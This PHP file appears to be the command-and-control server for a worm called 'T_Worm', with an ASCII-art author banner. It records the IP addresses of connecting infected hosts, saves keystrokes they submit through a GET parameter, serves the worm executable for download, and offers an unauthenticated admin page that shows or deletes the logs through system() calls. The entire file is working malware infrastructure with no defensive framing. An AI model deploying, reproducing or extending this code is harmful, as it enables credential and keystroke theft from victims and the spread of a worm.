<?php

   /*\______________             ____                      ___________________
  /                /|  ,-,______/    \______/\________    /                   \
 /By: h1t3m       / | /_____   /      \   __  \       \  /                    /
/_____      _____/  | ___  /  /  /\    \ (__) /    ,\  \/                    /
     /     / \      |/ _ \/  /  (__)   /  __  \__  | \    /\                /
     \     \  \_______/ \____\________/   | \____\_|  \__/  \root@h1t3m.org/
	  \_____\                        |____|                  \___________*/

////////////
// Config //
////////////
$t_log = "T_W0rMz.log"; // File connections are in (ip, time/date)
$t_keylog = "Keylog_TWORM.log"; // File storing keylog info
$t_dlfile = "tworm.exe"; // File the worm will download when run
////////////

if (isset($_GET['do']) && $_GET['do'] == "log")
{
	$t_content = "Connection from:".$_SERVER['REMOTE_ADDR']." at ".date("r",time())."<br />\n";
	if ($do_log = fopen($t_log, 'a')) 
	{
		fwrite($do_log, $t_content);
		fclose($do_log);
	}
	die;
}

elseif (isset($_GET['do']) && $_GET['do'] == "paste") 
{
    $t_logdo  = $_GET["l"];
	if ($do_keylog = fopen($t_keylog, 'a')) 
	{
		fwrite($do_keylog, $t_logdo);
		fclose($do_keylog);
	}
	die;
}

elseif (isset($_GET['do']) && $_GET['do'] == "dl") 
{
	if ( ( $size = filesize($t_dlfile) ) )
	if ( ( $fp = fopen($t_dlfile, "r") ) )
		if ( ( $source = fread($fp, $size) ) )
		{
				header("Accept-Ranges: bytes\r\n");
				header("Content-Length: ".$size."\r\n");
				header("Content-Disposition: inline; t_dlfile=$t_dlfile\n\r");
				header("Content-Type: application/octet-stream\r\n\r\n");
			die($source);
		}
		fclose($fp);	
}

elseif (isset($_GET['do']) && $_GET['do'] == "admin") 
{
echo "<html>
<head>
<title>T_Worm - Admin</title>
</head>
<style>
#t1{border:#000000 1px solid;font-family:verdana;font-size:9px;color:#CC0000;font-weight:bold;background-color:#333333}
#t2{font-family:verdana;font-size:9px;color:#CC0000;font-weight:bold}
#t3{border:#000000 1px solid;color:#CC0000;font-size:9px;font-family: verdana;width:100;background-color: #333333}
</style>
<body bgcolor='#000000' text='#00FF00'>
<table align='center'>
<center>
<pre>
  __________________    ____________________/\________    ___________________
 /                / \  /____   /      \   __  \       \  /                  /
/_____      _____/  / ___  /  /  /\    \ (__) /    \\  \/     Admin Panel  /
     /     / \      \/ _ \/  /  (__)   /  __  \__   \\    /\              /
     \_____\  \_______/ \____\________/___| \____\___\\__/  \____________/
</pre>
<tr height='5'>
	<td id=t2 align='center'><form action='' method='post'>
            <input type='hidden' name='showhits' value='1'>
			<input type='submit' name='button' value='ShowHits' id=t3></form>
	</td>
	<td id=t2 align='center'><form action='' method='post'>
            <input type='hidden' name='showlogs' value='1'>
			<input type='submit' name='button' value='ShowLogs' id=t3></form>
	</td>
	<td id=t2 align='center'><form action='' method='post'>
            <input type='hidden' name='clearhits' value='1'>
			<input type='submit' name='button' value='ClearHits' id=t3></form>
	</td>
	<td id=t2 align='center'><form action='' method='post'>
            <input type='hidden' name='clearlogs' value='1'>
			<input type='submit' name='button' value='ClearLogs' id=t3></form>
	</td>
</tr>
</table>

</body>
</html>";
}

if( $_POST['showhits']=="1") {
echo "<font color='#00FF00'>";
system("cat ".$t_log."");
}
if( $_POST['showlogs']=="1") {
echo "<font color='#00FF00'>";
system("cat ".$t_keylog."");
}
if( $_POST['clearhits']=="1") {
system("rm -rf ".$t_log."");
}
if( $_POST['clearlogs']=="1") {
system("rm -rf ".$t_keylog."");
}

?>